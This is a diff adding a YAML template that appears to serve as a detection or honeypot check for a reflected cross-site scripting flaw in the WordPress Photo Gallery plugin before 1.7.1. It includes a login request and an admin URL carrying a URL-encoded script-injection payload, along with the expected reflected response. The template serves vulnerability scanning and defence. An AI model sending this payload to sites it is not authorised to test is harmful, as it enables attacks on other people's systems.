@@ -1,0 +1,40 @@
+id: photo-gallery-xss
+info:
+  name: Photo Gallery < 1.7.1 - Cross-Site Scripting
+  author: ritikchaddha
+  description: 'The plugin does not escape some URLs before outputting them back in
+    attributes, leading to Reflected Cross-Site Scripting.
+
+    '
+  severity: medium
+  remediation: This is resolved in release 1.7.1.
+  reference:
+  - https://wpscan.com/vulnerability/e9f9bfb0-7cb8-4f92-b436-f08442a6c60a
+  - https://wordpress.org/plugins/photo-gallery/advanced/
+  metadata:
+    verified: true
+    max-request: 2
+    publicwww-query: /wp-content/plugins/photo-gallery
+  tags: wpscan,wp,wp-plugin,wordpress,xss,photo-gallery,authenticated
+traps:
+- request:
+    method: POST
+    path: /wp-login.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
+- request:
+    method: GET
+    path: /wp-admin/plugins.php?%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: '><script>alert(/XSS/)</script>Installed Plugins'
